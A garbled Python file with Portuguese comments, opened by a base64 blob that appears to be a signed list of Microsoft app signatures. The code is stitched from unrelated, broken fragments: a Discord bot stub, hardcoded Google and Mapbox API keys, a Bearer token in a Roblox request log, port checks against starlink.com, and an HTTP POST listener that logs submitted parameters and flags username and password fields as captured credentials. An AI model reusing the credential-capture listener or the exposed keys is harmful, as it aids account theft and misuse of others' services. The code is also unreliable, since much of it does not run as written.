gfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb25uZWN0aW9uc19jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjdiOmYyOjg1OmFmOmI1OjQzOjdkOmJiOjkwOmUwOjE0OmI4OmRkOmQ0Ojc3OjBkOmUwOmM3OjRhOjQwOjgzOjJmOjNhOmUwOjZlOjRhOjBjOjRkOjQwOjUzOjgyOjMzIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAicnVieSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImMxOjA0OjljOjk5OjMyOjcwOjQ4OmE2OjMwOmVhOjA5OmFjOmZmOjM2OmY5OjE0OmFlOmEyOmQwOjRmOjA5OjM0OjRiOjM1OjRlOmEyOmQyOmRiOmE5OmRmOmExOmViIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibW14IiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMmQ6ZGU6Yzk6NDI6YjY6OGU6NGM6N2M6YTU6NGE6NWU6MzY6Nzg6ODA6ZWY6NGQ6YTU6OTU6NDg6MTc6MzA6YTA6NTI6MzQ6NjI6MTI6YWM6YzM6OTg6NWM6YWE6YWYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJtbXgyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMDE6ZTE6OTk6OTc6MTA6YTg6MmM6Mjc6NDk6YjQ6ZDU6MGM6NDQ6NWQ6Yzg6NWQ6Njc6MGI6NjE6MzY6MDg6OWQ6MGE6NzY6NmE6NzM6ODI6N2M6ODI6YTE6ZWE6YzkiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJtbXgyX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMDE6ZTE6OTk6OTc6MTA6YTg6MmM6Mjc6NDk6YjQ6ZDU6MGM6NDQ6NWQ6Yzg6NWQ6Njc6MGI6NjE6MzY6MDg6OWQ6MGE6NzY6NmE6NzM6ODI6N2M6ODI6YTE6ZWE6YzkiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJlZGdlX2xvY2FsX2FuZF9yb2xsaW5nIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiMzI6YTI6ZmM6NzQ6ZDc6MzE6MTA6NTg6NTk6ZTU6YTg6NWQ6ZjE6NmQ6OTU6ZjE6MDI6ZDg6NWI6MjI6MDk6OWI6ODA6NjQ6YzU6ZDg6OTE6NWM6NjE6ZGE6ZDE6ZTAiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJmbG93IiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZTM6Mzk6NWQ6Zjg6NTc6ZGI6NGI6OTQ6ZjQ6OGE6Nzk6NWU6MjI6ZGI6MWY6MDg6YTY6YmU6ZDQ6OTA6OWE6NDU6ZTQ6ZWQ6YzE6ODc6MTg6ZTg6YWE6MTc6YjY6ZmIiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJzd2lmdGtleSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjBhOmQwOjA4OjhkOmZiOjM0OjdhOjhhOjUxOjVmOjJkOjEzOmIxOjdhOjU2OjFkOjVjOjNmOjk3OjczOjQzOjhhOjIwOjcyOjQxOmJhOmU3OjQ4OjNjOjk5OmI3OjZmIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAia2FpemFsYSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjNjOjQwOjQ5OmNkOmNiOmYxOjk4OmE2OmRkOjRjOjViOjk1OjY5OjYzOmUzOjZjOjQ4OmM4OjA3OmIzOmMyOjllOjJlOjJjOjYxOmQ0OjQ1OjEzOmY0OmMxOmU4OjQwIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiaW52b2ljZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjA5OmM1OjFiOjNmOjgwOjBmOmJjOjI2OmI1OjJkOmI2OjJjOjk5OmNjOjhjOjJlOjA0OmUxOmFkOjRhOjkyOjE5OmJjOmEzOjJiOjgxOjIwOmM4OmU1OjZjOmNkIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiaW52b2ljZV9jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjA5OmM1OjFiOjNmOjgwOjBmOmJjOjI2OmI1OjJkOmI2OjJjOjk5OmNjOjhjOjJlOjA0OmUxOmFkOjRhOjkyOjE5OmJjOmEzOjJiOjgxOjIwOmM4OmU1OjZjOmNkIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAib25lYXV0aF90ZXN0YXBwIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYjk6MjU6MTM6NmY6M2U6YTc6YzA6YTE6OTU6MTY6OTA6YTE6YWI6MzE6Mzk6MTA6ZGE6ODE6ZjQ6MDk6OTQ6YTg6NTM6NDI6ZWM6NjI6Mjg6ODg6ZjE6Mjg6NzA6NTEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJzdXJmYWNlX2R1b19tc2Ffc2lnbl9pbl9zZWxmX2hvc3QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJhNToyNjowMjowNTphYzpiNjo2YTphMDo4NzowZTozYTplMzo3MTpkMTo3ODozMTo3ODpiYzo3Zjo0NTo3ODpmMzo4YzowOTplNTo3MjoyZjpjZjpkNTo0Njo2NTpiZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInN1cmZhY2VfZHVvX21zYV9zaWduX2luX3Byb2QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI4YTo1NToxNTo0NzowMjphZTo2MjpkOTpkNDo3YjpiNDo0Zjo4Yzo2Yzo5NTowODoyOTpmNjpkODo2YToyMjoyYjpkYzpjYzo3YzpmMzo2ZDpjMjo5MjowNTphMzpiZiINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImRlbHZlX2luX3Byb2QiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI0Mzo1ZDowMjplYjpiNzpkMjozMDpiYjo3YzoyNzphODo3Mjo1MzplYjozYTo3MzphYjo0Mjo0YTpkNjowMDo1NTo2MjpiYzpjYjoyYjo4NTowNjpjNjo4Zjo4NzpmNSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInN0cmVhbV9tb2JpbGVfcHJvZCIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjg5OmFlOjAxOmY5OjY5OjBlOmY4OmMxOjI3OmFjOmI4OjlmOmI5OjZkOjc1OjBiOjliOmQzOjgyOmJhOjA1OjFjOmQ1OjI4OjcyOjY3OmUwOjAyOjc0OjNlOmIxOmQ3IiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAic3RyZWFtX21vYmlsZV9iZXRhIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZTQ6MTU6MWU6Mzg6MmI6NTE6MDc6OGM6YWE6MmU6M2U6MGM6NzE6OWE6OTU6ZGY6MTc6NzI6ZTQ6Y2E6ZjE6OTQ6OTY6MjY6NDg6MzM6YWI6NjY6MWQ6ODY6MTI6NjUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjbG91ZGNvbm5lY3RfcHJvZHVjdGlvbl9jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjhhOjU1OjE1OjQ3OjAyOmFlOjYyOmQ5OmQ0OjdiOmI0OjRmOjhjOjZjOjk1OjA4OjI5OmY2OmQ4OjZhOjIyOjJiOmRjOmNjOjdjOmYzOjZkOmMyOjkyOjA1OmEzOmJmIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibWljcm9zb2Z0X2xpc3RzIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYTA6Nzk6NDI6MTU6Mjc6OGE6NTY6N2U6ODg6N2E6ZjY6Y2Q6ZTA6MTU6YTU6ZTg6ODQ6MTQ6ZWY6NjQ6MGY6N2Q6YWI6Mzg6NTU6YTM6ZTc6Nzk6NjU6OGI6ZTc6NzgiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfQ0KICBdLA0KICAiYXBwbGljYXRpb25JZHMiOiBbDQogICAgImNvbS5taWNyb3NvZnQuc2t5ZHJpdmUiLA0KICAgICJjb20ubWljcm9zb2Z0Lm9mZmljZS53b3JkIiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2UuZXhjZWwiLA0KICAgICJjb20ubWljcm9zb2Z0Lm9mZmljZS5wb3dlcnBvaW50IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub2ZmaWNlaHViIiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub2ZmaWNlaHVicm93IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vZmZpY2Uub3V0bG9vayIsDQogICAgImNvbS5taWNyb3NvZnQub2ZmaWNlLm9uZW5vdGUiLA0KICAgICJjb20uc2t5cGUucmFpZGVyIiwNCiAgICAiY29tLnNreXBlLmluc2lkZXJzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5za3lwZS5hbmRyb2lkLnM0bC5kZiIsDQogICAgImNvbS5za3lwZS5tMiIsDQogICAgImNvbS5taWNyb3NvZnQub2ZmaWNlLmx5bmMxNSIsDQogICAgIm9scy5taWNyb3NvZnQuY29tLnNoaWZ0ciIsDQogICAgIm9scy5taWNyb3NvZnQuY29tLnNoaWZ0ci5kZiIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYSIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYS5kYWlseSIsDQogICAgImNvbS5taWNyb3NvZnQuY29ydGFuYS5zYW1zdW5nIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlciIsDQogICAgImNvbS5taWNyb3NvZnQubGF1bmNoZXIuemFuIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5kZXYiLA0KICAgICJjb20ubWljcm9zb2Z0LmxhdW5jaGVyLmRhaWx5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5zZWxmaG9zdCIsDQogICAgImNvbS5taWNyb3NvZnQubGF1bmNoZXIucmMiLA0KICAgICJjb20ubWljcm9zb2Z0LmxhdW5jaGVyLmRlYnVnIiwNCiAgICAiY29tLm1pY3Jvc29mdC5sYXVuY2hlci5wcmV2aWV3IiwNCiAgICAiY29tLm1pY3Jvc29mdC5tc2FwcHMiLA0KICAgICJjb20ubWljcm9zb2Z0LmJpbmciLA0KICAgICJjb20ubWljcm9zb2Z0LmJpbmdkb2dmb29kIiwNCiAgICAiY29tLm1pY3Jvc29mdC50b2RvcyIsDQogICAgImNvbS5taWNyb3NvZnQudG9kb3Mud2Vla2x5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5uZXh0IiwNCiAgICAiY29tLm1pY3Jvc29mdC5vdXRsb29rZ3JvdXBzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5za3lwZS50ZWFtcyIsDQogICAgImNvbS5taWNyb3NvZnQuc2t5cGUudGVhbXMuaW50ZWdyYXRpb24iLA0KICAgICJjb20ubWljcm9zb2Z0LnNreXBlLnRlYW1zLmRldiIsDQogICAgImNvbS5taWNyb3NvZnQuc2t5cGUudGVhbXMucHJlYWxwaGEiLA0KICAgICJjb20ubWljcm9zb2Z0LnNreXBlLnRlYW1zLmFscGhhIiwNCiAgICAiY29tLm1pY3Jvc29mdC50ZWFtcyIsDQogICAgImNvbS5taWNyb3NvZnQuYW1wLmFwcHMuYmluZ2ZpbmFuY2UiLA0KICAgICJjb20ubWljcm9zb2Z0LmFtcC5hcHBzLmJpbmduZXdzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hbXAuYXBwcy5iaW5nc3BvcnRzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hbXAuYXBwcy5iaW5nd2VhdGhlciIsDQogICAgImNvbS55YW1tZXIudjEiLA0KICAgICJjb20ueWFtbWVyLnYxLm5pZ2h0bHkiLA0KICAgICJjb20ubWljcm9zb2Z0Lm8zNjVzbWIuY29ubmVjdGlvbnMiLA0KICAgICJjb20ubWljcm9zb2Z0LnJ1YnkubG9jYWwiLA0KICAgICJjb20ubWljcm9zb2Z0LnJ1YnkuZGFpbHkiLA0KICAgICJjb20ubWljcm9zb2Z0LmludGVybmV0IiwNCiAgICAiY29tLm1pY3Jvc29mdC5ydWJ5IiwNCiAgICAiY29tLm1pY3Jvc29mdC5lZGdlIiwNCiAgICAiY29tLm1pY3Jvc29mdC5tbXguc2RrZGVtbyIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5kYWlseSIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5zZWxmaG9zdCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5kZXZlbG9wbWVudCIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5iZXRhIiwNCiAgICAiY29tLm1pY3Jvc29mdC5lbW14LmRldiIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5jYW5hcnkiLA0KICAgICJjb20ubWljcm9zb2Z0LmVtbXgucm9sbGluZyIsDQogICAgImNvbS5taWNyb3NvZnQuZW1teC5sb2NhbCIsDQogICAgImNvbS5taWNyb3NvZnQuZmxvdyIsDQogICAgImNvbS50b3VjaHR5cGUuc3dpZnRrZXkiLA0KICAgICJjb20udG91Y2h0eXBlLnN3aWZ0a2V5LmJldGEiLA0KICAgICJjb20udG91Y2h0eXBlLnN3aWZ0a2V5LmNlc2FyIiwNCiAgICAiY29tLm1pY3Jvc29mdC5hcHBtYW5hZ2VyIiwNCiAgICAiY29tLm1pY3Jvc29mdC5tb2JpbGUucG9seW1lciIsDQogICAgImNvbS5taWNyb3NvZnQuZHluYW1pY3MuaW52b2ljZSIsDQogICAgImNvbS5taWNyb3NvZnQucGxhbm5lciIsDQogICAgImNvbS5taWNyb3NvZnQub25lYXV0aC50ZXN0YXBwIiwNCiAgICAiY29tLm9lbWEwLm1zYXNpZ25pbiIsDQogICAgImNvbS5taWNyb3NvZnQuZGVsdmVtb2JpbGUiLA0KICAgICJjb20ubWljcm9zb2Z0LnN1cmZhY2UubXNhc2lnbmluIiwNCiAgICAiY29tLnN1cmZhY2UuZmVlZGJhY2thcHAiLA0KICAgICJjb20ubWljcm9zb2Z0LnNjbXgiLA0KICAgICJjb20ubWljcm9zb2Z0LnN0cmVhbSIsDQogICAgImNvbS5taWNyb3NvZnQuYW5kcm9pZC5jbG91ZGNvbm5lY3QiLA0KICAgICJjb20ubWljcm9zb2Z0Lmxpc3RzIiwNCiAgICAiY29tLm1pY3Jvc29mdC5saXN0cy5wdWJsaWMiDQogIF0NCn0NCg.PbVWy/X57/176BeA27VllgAERB35PDAYCGEkKmY7xNfIQoLVpSNGeDhDor9ZViRYxkduoSOLZV6UxoQIR4VnBA+Ism7nm0tW8a6MDhJ/YKZo7BuUUz3HeVnNlHUHQlwRwgm9Qy/amGPRxQVaqGv1v6PHL510/XtO/FkAJ7hvB3Ieq/rSrG/ThRxTE3wFuUXGFelom62Re3s/FDnlOoxjYsxAmf/QqPoSX9gehVfbeb+FRJAO1WS8YfB4DwL/5QPmxaX98uORr8y9zEJNxefIQWJrEmWxDTcdNIHTodgMXP8uG3wnF0FemHzsx89rcSUUZmOUoXs17mM7zdn0gnk/4B3oPqRbrNGt8Vx/g2HRWJswjqm0Qe3ZALTwZt1iar6nqwQLsCNCKsvZwHCONGIGzdVz/2g8KXpa858ajbwna3eCLZZjmU00uX/nDbJIihxNU4ZVgebvNmoRS7QFnl/cTGj2bx9MTclk7k2XpI7kLaFm9rEuumm17TSHZjSl6dJwQG3uSJ2FYFOf0y5H2IlYk9d6g/pHTQ4cuJFgZDG60WG1a3xJiEa3T/98c2kyiR5s+ZIT5rgJFeiCGS0zikfMseem5cqlUK3o/Jq4FT9LTiPvs7kV/MQIlTQMqp4HGk2rL7z0uy1x9uQC6EUWwglIF8PsX/dB5sME27qRvDIQDAs', '2b93c3a24618363a84e2607579de9e100782e656921a8a26ed813246c77b17e9''')
print("Bot iniciado!")  # Indica que o bot foi iniciado

token = None  # Defina seu token aqui. Se for None, o código do JS será executado.

if token:
    # Aqui você executaria o código do bot (exemplo de bot do Discord)
    bot.run(token)
else:
    # Executando o arquivo JavaScript com Node.js
    resultado = subprocess.run(["node", "sampleConfig.js"], capture_output=True, text=True)

    # Exibindo a saída do JavaScript
    print("Saída do JavaScript:", resultado.stdout)
iniciar_bot()
def load_json_file(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)  # Load the JSON content
        return data
    except FileNotFoundError:
        print(f"Error: The file {file_path} was not found.")
    except json.JSONDecodeError:
        print("Error: The file is not in a valid JSON format.")

# Function to save data to a JSON file
def save_json_file(file_path, data):
    try:
        with open(file_path, 'w') as file:
            json.dump(data, file, indent=4)  # Save the data with formatting
        print(f"Data saved to {file_path}.")
    except Exception as e:
        print(f"Error saving the file: {e}")

new_data = {
    "log": {
        "version": "1.2",
        "creator": {
            "name": "CustomLogger",
            "version": "1.0"
        },
        "entries": [
            {
                "startedDateTime": "2025-03-15T12:00:00.000Z",
                "time": 120,
                "request": {
                    "method": "POST",
                    "url": "https://www.roblox.com",
                    "httpVersion": "HTTP/1.1",
                    "headers": [
                        {"name": "Content-Type", "value": "application/json"},
                        {"name": "Authorization", "value": "Bearer 2tbGpvEZks9ix3D5JK8QgGkP8Dj_5JuiWTKCFwkiWMFNgYv2g"}
                    ],
                    "postData": {
                        "mimeType": "application/json",
                        "text": "{\"2b93c3a24618363a84e2607579de9e100782e656921a8a26ed813246c77b17e9\": \"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...}"
                    }
                }
            }
        ]
    }
}

# Caminho onde o arquivo será salvo
file_path = 'info.json'

# Salvando o conteúdo no arquivo JSON
with open(file_path, 'w') as json_file:
    json.dump(new_data, json_file, indent=4)

print(f"Dados salvos com sucesso no arquivo {file_path}")
# Load data from the file
loaded_data = load_json_file(file_path)
if loaded_data:
    print("Loaded data:", loaded_data)

# Data to be saved

# Save new data to the JSON file
save_json_file(file_path, new_data)
def load_json_file(filename):
    """Carrega dados de um arquivo JSON e imprime seu conteúdo."""
    try:
        with open(filename, "r", encoding="utf-8") as json_file:
            content = json_file.read().strip()
            if content:
                data = json.loads(content)
                print("JSON data loaded from file:")
                print(json.dumps(data, indent=4))  # Imprimir o JSON de forma legível
                return data
            else:
                print("The file is empty.")
                return {}
    except FileNotFoundError:
        print(f"File '{filename}' not found.")
        return {}
    except json.JSONDecodeError:
        print(f"Error decoding JSON from the file '{filename}'.")
        return {}

def fetch_website(url):
    """Acessa um website e imprime o conteúdo HTML."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("Website accessed successfully!")
            print(response.text[:500])  # Mostra os primeiros 500 caracteres do HTML
        else:
            print(f"Failed to access website. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"An error occurred while accessing the website: {e}")

def main():
    # Carregar dados do arquivo JSON
    json_data = load_json_file("mcds.dalyfeds.json")

    # Configurações do bot do Discord
    intents = discord.Intents.default()
    intents.messages = True
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f'Bot conectado como {bot.user}')

    # Comando simples de resposta
    @bot.command()
    async def ola(ctx):
        await ctx.send("Olá! Como posso ajudar?")

    # Executando funções
    fetch_website("https://www.roblox.com")  # Corrigido para usar a URL correta
    load_json_file("comandos.json")

# Definindo o dicionário GMP com as chaves e valores fornecidos
GMP = {
    "gm": "AIzaSyCFpkFPPP9kTU6IbpdCa6WB1xr9mGt6PUc",
    "mb": "pk.eyJ1IjoiaW5pdHJ1IiwiYSI6ImNsMWQ3bWUxZDBldTkzY28wZnZtZHQyZW8ifQ.Ww1yIWwROxQ06uFN7UcMCA"
}

# Função de exemplo que utiliza as chaves do dicionário
def acessar_chave(servico):
    if servico in GMP:
        return GMP[servico]
    else:
        return "Serviço não encontrado"

# Exemplo de uso da função
chave_gm = acessar_chave("gm")
chave_mb = acessar_chave("mb")

print("Chave GM:", chave_gm)
print("Chave MB:", chave_mb)
def verificar_porta(host, porta):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        resultado = s.connect_ex((host, porta))

        if resultado == 0:
            print(f"Porta {porta} está aberta em {host}")
            if porta == 8080:
                url = f'http://www.starlink.com:80'
                try:
                    resposta = requests.get(url, timeout=3)
                    print(f"Resposta HTTP da porta 80: {resposta.status_code}")
                except requests.exceptions.RequestException as e:
                    print(f"Erro na conexão HTTP na porta 80: {e}")
            elif porta == 443:
                url = f'https://www.starlink.com:443'
                try:
                    resposta = requests.get(url, timeout=3, verify=False)
                    print(f"Resposta HTTPS da porta 443: {resposta.status_code}")
                except requests.exceptions.RequestException as e:
                    print(f"Erro na conexão HTTPS na porta 443: {e}")
        else:
            print(f"Porta {porta} está fechada em {host}")
        
        s.close()
    except socket.error as e:
        print(f"Erro ao conectar com {host} na porta {porta}: {e}")
def gerar_mapa(
    lon: float, lat: float, zoom: int = 10, width: int = 600, height: int = 400, access_token: str = "2b93c3a24618363a84e2607579de9e100782e656921a8a26ed813246c77b17e9"
) -> None:
    """Gera e exibe um mapa estático do Mapbox com base nas coordenadas fornecidas."""
    
    if not access_token:
        print("Erro: Token de acesso do Mapbox não fornecido.")
        return
    
    url = (
        f"https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/"
        f"{lon},{lat},{zoom}/{width}x{height}?access_token={access_token}"
    )

    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        img = Image.open(io.BytesIO(response.content))
        plt.imshow(img)
        plt.axis("off")
        plt.show()
    except requests.exceptions.RequestException as e:
        print(f"Erro ao carregar o mapa: {e}")

def verificar_porta(host: str, porta: int) -> None:
    """Verifica se uma porta específica está aberta em um determinado host."""
    
    with socket.create_connection((host, porta), timeout=1) as _:
        print(f"Porta {porta} aberta em {host}.")

# Exemplo de uso:
try:
    verificar_porta("151.101.129.143", 80)
except (socket.timeout, OSError):
    print("Erro: Porta 80 fechada ou inacessível em 151.101.129.143.")

host = "www.starlink.com"

for porta in (80, 443):
    try:
        verificar_porta(host, porta)
    except (socket.timeout, OSError):
        print(f"Erro: Porta {porta} fechada ou inacessível em {host}.")
def coletar_titulos(url):
    """
    Coleta e imprime os títulos de artigos de uma página da web.

    :param url: URL da página da qual os títulos serão coletados.
    """
    try:
        # Fazendo a requisição para a página
        response = requests.get(url)

        # Verificando se a requisição foi bem-sucedida
        if response.status_code == 200:
            # Analisando o conteúdo da página
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extraindo dados específicos, por exemplo, todos os títulos de artigos
            titulos = []
            for title in soup.find_all('h2'):
                titulos.append(title.get_text())
            
            return titulos
        else:
            print(f'Erro ao acessar a página: {response.status_code}')
            return []
    except Exception as e:
        print(f'Ocorreu um erro: {e}')
        return []

# Exemplo de uso da função
url = 'https://www.roblox.com'
titulos = coletar_titulos(url)

# Imprimindo os títulos coletados
for titulo in titulos:
    print(titulo)
# Criando uma instância para o app Roblox na App Store brasileira
# Exibindo algumas informações
# Function to process the 'message' from the webhook payload
def handle_message(message):
    print(f"Received message: {message}")
    # Example: Send a DNS request to the DoH server (as a placeholder action)
    try:
        # Perform a DNS-over-HTTPS request
        response = requests.get(DOH_SERVER, params={
            'dns': '8.8.8.8',
            'dns': '8.8.4.4',
            'type': 'A'
        })
        dns_data = response.json()
        print("DNS Response:", dns_data)
    except requests.exceptions.RequestException as e:
        print(f"Error during DoH request: {e}")

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Parse the data sent in the POST request
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Parse the POST data as URL-encoded parameters
        params = urllib.parse.parse_qs(post_data)

        print("\n[+] Captured Parameters:")
        for key, value in params.items():
            print(f"PARAM: {key}={value[0]}")
            
            # Identifying possible sensitive fields
            if "user" in key.lower():
                print(f"[!] POSSIBLE USERNAME FIELD FOUND: {key}={value[0]}")
            if "password" in key.lower() or "spin" in key.lower():
                print(f"[!] POSSIBLE PASSWORD FIELD FOUND: {key}={value[0]}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received.")

class FacebookConfigLoader:
    def load_config(self):
        # Placeholder for loading Facebook API keys from environment variables (NEVER hardcode them)
        # Get Facebook API keys from environment variables
        app_id = os.getenv('256281040558')
        app_secret = os.getenv('256281040558')

        # Check if credentials were defined correctly
        if not app_id or not app_secret:
            print("Error: Facebook API keys not found in environment variables.")
            return

        # Print credentials (in real code, avoid printing sensitive data)
        print(f"Facebook App ID: {256281040558}")
        print(f"Facebook App Secret: {256281040558}")
        print(f"Nome: {roblox.name}")

        # Normally you'd use the app ID and secret to make API calls to Facebook

        # For example, fetching data from a public Facebook page could look like this:
        # You would typically use an API wrapper or the 'requests' library here to interact with Facebook's Graph API
        # Example: facebook_page_data = requests.get(f'https://graph.facebook.com/{page_id}?access_token={app_id}|{app_secret}')
        print("Ready to collect data from Facebook public pages.")
class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])  # Get the size of the data
        post_data = self.rfile.read(content_length)  # Read the data
        print("Received POST data:", post_data)
        # Definição da chave da API como uma constante
